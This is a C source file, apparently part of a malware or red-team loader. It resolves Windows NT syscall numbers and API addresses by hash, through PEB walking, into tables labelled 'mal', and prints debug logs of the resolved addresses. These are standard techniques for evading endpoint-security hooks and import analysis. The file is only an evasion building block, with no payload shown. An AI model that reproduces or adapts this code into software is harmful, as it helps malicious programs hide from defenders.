/*
 *
 * All API sets are defined in apisets.h and apisets.c.
 * Follow the instructions in above files to add or remove APIs.
 *
 */

#include <windows.h>
#include "apisets.h"
#include "pebwalking.h"
#include "log.h"

BOOL init_nt_syscalls()
{
    _DLOGA("[*]Initialize APIs ...\n");

    size_t i = 0;
    WORD mal_nt_api_cnt = sizeof(g_mal_nt_api_tbl) / sizeof(NT_SYSCALL);
    PNT_SYSCALL ptr_mal_nt_api_tbl = &g_mal_nt_api_tbl;

    for (; i < mal_nt_api_cnt; i ++)
    {
        if (!resolve_nt_syscall(mal_nt_hash_arr[i], (ptr_mal_nt_api_tbl + i)))
        {
            _DLOGA("[-]Failed to resolve %s ... Abort ...\n", mal_nt_name_arr[i]);
            return FALSE;
        }
        _DLOGA("[+]SSN for %s is: 0x%.2X\n\t>>> Executing @ >>> 0x%p\n\n",
                mal_nt_name_arr[i], (ptr_mal_nt_api_tbl + i)->dw_ssn, (ptr_mal_nt_api_tbl + i)->p_nt_func_addr);
    }

    return TRUE;
}

BOOL init_win_api()
{
    size_t win_api_cnt = sizeof(g_win_api_tbl) / sizeof(FARPROC);
    FARPROC* ptr_win_api_tbl = &g_win_api_tbl;

    for (size_t i = 0; i < win_api_cnt; i ++)
    {
        *(ptr_win_api_tbl + i) = get_proc_addr_by_hash(get_mod_hndl_by_hash(dll_hash_arr[i]), win_api_hash_arr[i]);
        if (NULL == *(ptr_win_api_tbl + i))
        {
            _DLOGA("[-]Failed to resolve %s ... Abort ...\n", win_api_name_arr[i]);
            return FALSE;
        }
        _DLOGA("[+]Successfully resolved auxiliary API %s\n\n", win_api_name_arr[i]);
    }
    return TRUE;
}
